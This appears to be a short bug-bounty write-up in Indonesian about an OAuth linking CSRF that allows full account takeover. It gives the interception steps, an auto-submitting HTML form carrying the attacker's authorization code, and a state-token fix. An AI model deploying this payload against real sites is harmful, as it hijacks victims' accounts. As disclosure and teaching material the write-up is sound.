# I Found !! Full Account Takeover via OAuth Linking CSRF bugs

- **Source URL:** https://skysenz.medium.com/i-found-full-account-takeover-via-oauth-linking-csrf-bugs-b5f4c155a456?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260506181610/https://skysenz.medium.com/i-found-full-account-takeover-via-oauth-linking-csrf-bugs-b5f4c155a456?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/13492 (id 13492)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
I Found !! Full Account Takeover via OAuth Linking CSRF bugs

Halo semua, saya mau sharing bug Full Account Takeover lewat celah OAuth Linking CSRF yang baru saja masuk tahap Pending Program Review

*Inti Bug: Aplikasi tidak validasi parameter state saat hubungkan akun Google jadi penyerang bisa “nempelin” akun Google mereka ke sesi korban.*

**Steps:**

***Attacker:*** Klik “Link Google”, intercept callback URL di Burp: \[https://target.com/auth/google/oauth?code=CODE\_PENYERANG&state=\](https://target.com/auth/google/oauth?code=CODE\_PENYERANG&state=)... copy url dan Drop request agar code tidak hangus

**Exploit: Buat HTML simpel buat auto-submit URL tadi:** *HTML*`<form action="https://target.com/auth/google/oauth"> <input type="hidden" name="code" value="CODE_PENYERANG"> <script>document.forms[0].submit()</script> </form> Victim: Begitu korban klik link saat login, akun Google penyerang otomatis terikat ke akun mereka.`

***Impact:*** Penyerang dapet akses penuh ke akun korban secara permanen karena akun Google penyerang udah nempel di profil korban jadi bisa bebas bypass login buat curi data sensitif atau ganti pengaturan akun sesuka hati. Fix: Selalu gunakan state unik sebagai token anti-CSRF yang terikat session user.
